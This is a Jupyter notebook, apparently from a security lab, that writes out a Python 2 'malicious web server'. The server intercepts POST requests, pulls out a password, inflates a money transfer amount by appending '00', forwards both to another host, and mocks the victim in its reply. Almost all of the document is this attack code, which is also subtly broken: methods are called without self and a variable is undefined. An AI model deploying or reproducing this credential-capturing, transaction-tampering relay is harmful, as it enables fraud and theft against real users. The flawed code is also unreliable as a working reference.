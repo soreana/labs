{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing malicious-web-server.py\n"
     ]
    }
   ],
   "source": [
    "%%writefile malicious-web-server.py\n",
    "\n",
    "from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer\n",
    "import SocketServer\n",
    "import requests\n",
    "\n",
    "\n",
    "get_res = \"<html><body><h1>Devil Hi!</h1></body></html>\"\n",
    "\n",
    "class S(BaseHTTPRequestHandler):\n",
    "    password = None\n",
    "        \n",
    "    def _set_headers(self):\n",
    "        self.send_response(200)\n",
    "        self.send_header('Content-type', 'text/html')\n",
    "        self.end_headers()\n",
    "        \n",
    "    def do_GET(self):\n",
    "        self._set_headers()\n",
    "        #self.wfile.write(\"<html><body><h1>Devil Hi!</h1></body></html>\")\n",
    "        self.wfile.write(get_res)\n",
    "\n",
    "    def do_HEAD(self):\n",
    "        self._set_headers()\n",
    "        \n",
    "    def extract_pass(self,data):\n",
    "        return data[data.find(\"password=\")+1:]\n",
    "    \n",
    "    def extract_money(self,data):\n",
    "        return data[data.find('=')+1:data.find('&')].replace(\"%2C\",\",\").replace(\"%24\",\"$\")\n",
    "    \n",
    "    def do_POST(self):\n",
    "        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data\n",
    "        post_data = self.rfile.read(content_length) # <--- Gets the data itself\n",
    "        print(\"POST request,\\nPath: %s\\nHeaders:\\n%s\\n\\nBody:\\n%s\\n\",\n",
    "            str(self.path), str(self.headers), post_data.decode('utf-8'))\n",
    "        print(post_data)\n",
    "        self._set_headers()\n",
    "        \n",
    "        data = {'transfer':extract_money(post_data) + '00' ,'password':extract_pass(data)}\n",
    "        r = requests.post('http://10.0.0.1/',data=data)\n",
    "        \n",
    "        self.wfile.write(r.text[:-1]+' Hoho Haha Haha HE He :Evile laugh')\n",
    "\n",
    "def run(server_class=HTTPServer, handler_class=S, port=80):\n",
    "    server_address = ('', port)\n",
    "    httpd = server_class(server_address, handler_class)\n",
    "    print 'Starting httpd...'\n",
    "    httpd.serve_forever()\n",
    "        \n",
    "if __name__ == \"__main__\":\n",
    "    run()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.16"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
